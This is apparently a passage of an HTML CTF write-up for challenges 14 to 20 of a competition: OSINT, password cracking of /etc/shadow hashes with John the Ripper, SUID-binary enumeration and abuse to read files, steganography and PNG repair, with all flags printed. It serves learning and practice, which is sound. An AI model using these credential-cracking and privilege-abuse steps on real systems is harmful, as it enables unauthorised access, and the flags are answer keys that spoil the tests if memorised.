+    <div class="chall" id="c14">
+      <div class="chall-header">
+        <span class="chall-num">14</span>
+        <h2 class="chall-name">Car on the Fire — Part 4</h2>
+        <span class="chall-cat cat-osint">OSINT</span>
+      </div>
+      <p class="chall-desc">GeoOSINT challenge. Found the original video, identified the exact accident location on Google Street View, then identified the nearest food market.</p>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{Odessa_Grocery}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 15. PASSWORD RECOVERY 1 -->
+    <div class="chall" id="c15">
+      <div class="chall-header">
+        <span class="chall-num">15</span>
+        <h2 class="chall-name">Password Recovery 1</h2>
+        <span class="chall-cat cat-misc">Misc</span>
+      </div>
+      <p class="chall-desc">A shadow hash for user <strong>alex</strong>. Hint mentioned seasons. Built a custom wordlist with season+year+special char combinations, then cracked with John the Ripper.</p>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="prompt">└─$ </span>john --wordlist=custom_wordlist.txt shadow.txt
+<span class="out">Autumn2024!      (alex)
+1g 0:00:00:00 DONE — Session completed.</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{Autumn2024!}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 16. MISC 7 -->
+    <div class="chall" id="c16">
+      <div class="chall-header">
+        <span class="chall-num">16</span>
+        <h2 class="chall-name">Misc 7</h2>
+        <span class="chall-cat cat-pwn">Pwn</span>
+      </div>
+      <p class="chall-desc">SSH access via provided private key. Enumerated SUID binaries, found a custom <code>/etc/security/print_file</code> binary that could read arbitrary files — used it to read the flag.</p>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="prompt">└─$ </span>ssh -i id_rsa ubuntu@54.255.1.14
+<span class="prompt">ubuntu@ip$ </span>find / -perm -4000 2>/dev/null
+<span class="out">/etc/security/print_file
+...</span>
+<span class="prompt">ubuntu@ip$ </span>/etc/security/print_file /home/ubuntu/flag
+<span class="out">CURTIN_CTF{$3tU1D}</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{$3tU1D}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 17. PASSWORD RECOVERY 2 -->
+    <div class="chall" id="c17">
+      <div class="chall-header">
+        <span class="chall-num">17</span>
+        <h2 class="chall-name">Password Recovery 2</h2>
+        <span class="chall-cat cat-misc">Misc</span>
+      </div>
+      <p class="chall-desc">Shell access on a server. Read <code>/etc/shadow</code> and <code>/etc/passwd</code> via sudo, combined with <code>unshadow</code>, then cracked using John's single mode.</p>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="prompt">└─$ </span>john --single unshadow.txt --format=crypt
+<span class="out">RodriguEsJohn    (john)
+Session completed.</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{RodriguEsJohn}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 18. TRANSPARENCY -->
+    <div class="chall" id="c18">
+      <div class="chall-header">
+        <span class="chall-num">18</span>
+        <h2 class="chall-name">Transparency</h2>
+        <span class="chall-cat cat-stego">Stego</span>
+      </div>
+      <p class="chall-desc">Given <code>stego.png</code>. Used <strong>zsteg</strong> to analyse all bit planes. The alpha channel LSB contained a long text block with the flag appended at the end.</p>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="prompt">└─$ </span>zsteg -E b8,a,lsb,xy stego.png
+<span class="out">Digital forensics (sometimes known as digital forensic science)...
+...
+CURTIN_CTF{imagine_not_using_steghide}</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{imagine_not_using_steghide}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 19. CRAZY SIGNAL -->
+    <div class="chall" id="c19">
+      <div class="chall-header">
+        <span class="chall-num">19</span>
+        <h2 class="chall-name">Crazy Signal</h2>
+        <span class="chall-cat cat-stego">Stego</span>
+      </div>
+      <p class="chall-desc">Given an <code>audio.mpeg</code> file with an alien-sounding signal. Identified as <strong>SSTV (Slow Scan Television)</strong>. Converted to WAV and decoded to an image containing a QR code.</p>
+      <div class="step">
+        <div class="step-title">APPROACH</div>
+        <p>Converted mpeg → wav online, then used the <strong>sstv</strong> Python tool to decode. The output image contained a QR code — scanned with CyberChef to get the flag.</p>
+      </div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="prompt">└─$ </span>sstv -d flag.wav -o result.png
+<span class="out">[sstv] Detected SSTV mode Robot 36
+[sstv] Decoding image... Done!</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{SP4C3_EXPL0RERS_MU5T_KNOW_AB0U7_SSTV}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 20. IHEADER -->
+    <div class="chall" id="c20">
+      <div class="chall-header">
+        <span class="chall-num">20</span>
+        <h2 class="chall-name">IHeader</h2>
+        <span class="chall-cat cat-forensics">Forensics</span>
+      </div>
+      <p class="chall-desc">A PNG file with corrupted chunk headers. Used a hex editor to replace incorrect bytes <code>AAAA</code>/<code>BBBB</code> with correct PNG chunk identifiers <code>IHDR</code>/<code>IDAT</code>.</p>
+      <div class="code-wrap">
+        <div class="code-label"><span class="code-lang">Hex Fix</span></div>
+        <pre>41 41 41 41  →  49 48 44 52   (AAAA → IHDR)
+42 42 42 42  →  49 44 41 54   (BBBB → IDAT)</pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{m4gic_byt3s_are_s0_mag1cal}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- CONCLUSION -->
+    <div class="conclusion-box" id="conclusion">
+      <h3>Conclusion</h3>
+      <p>Solved <strong>20 challenges</strong> across Web Exploitation, Cryptography, OSINT, Forensics, Steganography, and Privilege Escalation. Finished <strong>4th place</strong> overall in this 24-hour nationwide competition.</p>
+      <p>Shoutout to my teammates who stayed up through the night grinding with me. Challenges like Dance of the Stream (custom ChaCha cipher) and Amalgam (ElGamal discrete log) were particularly satisfying solves.</p>
+      <div class="team-chips">
+        <span class="team-chip tc-you">@KingPinzz</span>
+        <span class="team-chip tc-mate">@n3r</span>
+        <span class="team-chip tc-mate">@ichimon</span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- TOC -->
+  <div class="writeup-toc">
+    <div class="toc-box">
+      <div class="toc-title">— TABLE OF CONTENTS</div>
+      <ul class="toc-list">
+        <li><a href="#c1">01 · Easy Login</a></li>
+        <li><a href="#c2">02 · Crumb Trails</a></li>
+        <li><a href="#c3">03 · Valuable Feedback</a></li>
+        <li><a href="#c4">04 · Sneaky Source</a></li>
+        <li><a href="#c5">05 · Internal View</a></li>
+        <li><a href="#c6">06 · Trivial 2</a></li>
+        <li><a href="#c7">07 · Bluff</a></li>
+        <li><a href="#c8">08 · Amalgam</a></li>
+        <li><a href="#c9">09 · RSA1</a></li>
+        <li><a href="#c10">10 · RSA2</a></li>
+        <li><a href="#c11">11 · Dance of the Stream</a></li>
+        <li><a href="#c12">12 · The Package</a></li>
+        <li><a href="#c13">13 · Car on the Fire 1</a></li>
+        <li><a href="#c14">14 · Car on the Fire 4</a></li>
+        <li><a href="#c15">15 · Password Recovery 1</a></li>
+        <li><a href="#c16">16 · Misc 7</a></li>
+        <li><a href="#c17">17 · Password Recovery 2</a></li>
+        <li><a href="#c18">18 · Transparency</a></li>
+        <li><a href="#c19">19 · Crazy Signal</a></li>
+        <li><a href="#c20">20 · IHeader</a></li>
+        <li><a href="#conclusion">Conclusion</a></li>
+      </ul>
+    </div>
+  </div>
+
+</div>
+
+<script>
+// Copy code button
+function copyCode(btn) {
+  const pre = btn.closest('.code-wrap').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(() => {
+    btn.textContent = 'copied!';
+    btn.style.color = 'var(--accent)';
+    setTimeout(() => { btn.textContent = 'copy'; btn.style.color = ''; }, 2000);
+  });
+}
+
+// TOC active on scroll
+const challSections = document.querySelectorAll('.chall, .conclusion-box');
+const tocLinks = document.querySelectorAll('.toc-list a');
+const io = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      tocLinks.forEach(a => a.classList.remove('active'));
+      const link = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+      if (link) link.classList.add('active');
+    }
+  });
+}, { threshold: 0.4 });
+challSections.forEach(s => io.observe(s));
+</script>
+</body>
+</html>
